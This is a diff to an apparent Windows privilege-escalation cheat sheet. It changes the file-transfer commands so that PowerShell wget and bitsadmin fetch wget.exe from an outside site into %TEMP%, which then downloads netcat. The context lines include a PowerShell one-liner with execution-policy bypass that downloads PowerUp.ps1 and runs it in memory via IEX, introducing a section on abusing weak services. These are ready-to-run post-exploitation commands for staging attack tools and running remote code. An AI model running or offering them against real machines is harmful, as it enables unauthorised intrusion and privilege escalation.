@@ -191,25 +191,19 @@ Once you have the binary and dependency dll on you can run:
 ## Uploading / Downloading files 
 a wget using powershell
 
-    powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs-scripts.zip -UseBasicParsing -OutFile %TEMP%\scripts.zip"
+    powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs/wget.exe -UseBasicParsing -OutFile %TEMP%\wget.exe"
 
 wget using bitsadmin (when powershell is not present)
 
-    cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/downloadR/wpecs-scripts.zip %TEMP%\scripts.zip"
+    cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/download/wpecs/wget.exe %TEMP%\wget.exe"
 
-wget via command shortcut
-use `wget link`
+now you have wget.exe that can be executed from %TEMP%wget
+for example I will use it here to download netcat
 
-    doskey wget="cmd /c bitsadmin /transfer myjob /download /priority high $1 %TEMP%\scripts.zip"
-    wget https://addaxsoft.com/downloadR/wpecs-scripts.zip
-
-or using powershell; note: this might be broken at the moment
-
-    doskey wget="powershell -Noninteractive -NoProfile -command wget $1 -UseBasicParsing -OutFile %TEMP%\scripts.zip"
-    wget https://addaxsoft.com/downloadR/wpecs-scripts.zip
+    %TEMP%\wget https://addaxsoft.com/download/wpecs/nc.exe
 
 
-	
+
 # Abusing Weak Services
 this is the section where "shit gets real"
 If you have no powershell skip the first part of this section and go to the manual way
@@ -219,7 +213,7 @@ if you do, you're in a bit of luck to automate this using PowerSploit > PrivEsc 
 Usage and details of this script can be found [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
 
     powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
-    
+
 
 
 -----
